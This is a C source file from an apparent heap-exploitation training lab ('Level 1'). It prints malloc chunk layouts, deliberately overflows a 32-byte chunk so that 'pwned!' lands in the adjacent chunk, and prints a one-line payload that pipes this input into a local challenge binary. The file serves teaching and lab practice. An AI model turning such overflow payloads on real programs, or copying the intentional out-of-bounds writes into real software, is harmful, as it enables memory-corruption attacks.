/**
 * Level 1: Heap Overflow Exploit (C Version)
 *
 * This C program demonstrates the heap overflow vulnerability
 * and verifies the exploit concept.
 *
 * Compile: gcc -o exploit exploit.c ../common/src/heap_utils.c
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "../common/include/heap_utils.h"
#include "../common/include/debug_utils.h"

void demonstrate_heap_layout() {
    printf("\n=== Demonstrating Heap Layout ===\n");

    // Allocate chunks like in the vulnerable program
    char *chunk1 = malloc(32);
    char *chunk2 = malloc(32);

    printf("chunk1: %p\n", chunk1);
    printf("chunk2: %p\n", chunk2);
    printf("Distance: %ld bytes (0x%lx)\n\n", chunk2 - chunk1, chunk2 - chunk1);

    // Show chunk metadata
    printf("Chunk 1 metadata:\n");
    print_chunk_info((void *)((char *)chunk1 - 0x10));

    printf("\nChunk 2 metadata:\n");
    print_chunk_info((void *)((char *)chunk2 - 0x10));

    free(chunk1);
    free(chunk2);
}

void simulate_overflow() {
    printf("\n=== Simulating Heap Overflow ===\n");

    char *chunk1 = malloc(32);
    char *chunk2 = malloc(32);

    // Initialize chunk2 with known data
    strcpy(chunk2, "original");
    printf("Before overflow:\n");
    printf("  chunk1: %s\n", chunk1);
    printf("  chunk2: %s\n\n", chunk2);

    // Simulate overflow: write more than 32 bytes to chunk1
    char overflow_data[100];
    memset(overflow_data, 'A', 32);  // Fill chunk1
    strcpy(overflow_data + 32, "pwned!");  // Overflow into chunk2

    printf("Copying %ld bytes to chunk1 (size: 32)...\n", strlen(overflow_data) + 1);
    memcpy(chunk1, overflow_data, strlen(overflow_data) + 1);

    printf("After overflow:\n");
    printf("  chunk1: %.35s...\n", chunk1);
    printf("  chunk2: %s\n", chunk2);

    // Check if exploit succeeded
    if (strcmp(chunk2, "pwned!") == 0) {
        printf("\n✓ Overflow successful! chunk2 contains 'pwned!'\n");
    } else {
        printf("\n✗ Overflow failed\n");
    }

    free(chunk1);
    free(chunk2);
}

void test_exploit_with_read() {
    printf("\n=== Testing Exploit with read() ===\n");

    // This simulates the actual vulnerable program
    char *chunk1 = malloc(32);
    char *chunk2 = malloc(32);

    strcpy(chunk2, "target");

    printf("chunk2 initially: %s\n", chunk2);

    // Simulate reading from stdin
    // In real exploit, this would come from user input
    char input[100];
    memset(input, 'A', 32);
    strcpy(input + 32, "pwned!");

    printf("Simulating read(0, chunk1, 100)...\n");
    memcpy(chunk1, input, 100);

    printf("chunk2 after overflow: %s\n", chunk2);

    if (strcmp(chunk2, "pwned!") == 0) {
        printf("✓ Exploit successful!\n");
    }

    free(chunk1);
    free(chunk2);
}

void interactive_exploit() {
    printf("\n=== Interactive Exploit ===\n");
    printf("This will launch the vulnerable program.\n");
    printf("Use this payload: 'A' * 32 + 'pwned!'\n\n");

    printf("Example command:\n");
    printf("  python3 -c \"print('A'*32 + 'pwned!')\" | ./challenge/vuln\n\n");
}

int main() {
    printf("╔════════════════════════════════════════════════╗\n");
    printf("║   Level 1: Heap Overflow Exploit (C Version)   ║\n");
    printf("╚════════════════════════════════════════════════╝\n");

    // Demonstrate heap layout
    demonstrate_heap_layout();

    // Simulate the overflow
    simulate_overflow();

    // Test with read() simulation
    test_exploit_with_read();

    // Show how to exploit the actual program
    interactive_exploit();

    printf("\n=== Key Concepts ===\n");
    printf("1. malloc() allocates memory on the heap\n");
    printf("2. Adjacent allocations are often contiguous\n");
    printf("3. Writing past the end of a chunk overflows into adjacent chunks\n");
    printf("4. This allows controlling data in adjacent chunks\n");
    printf("\n");

    return 0;
}
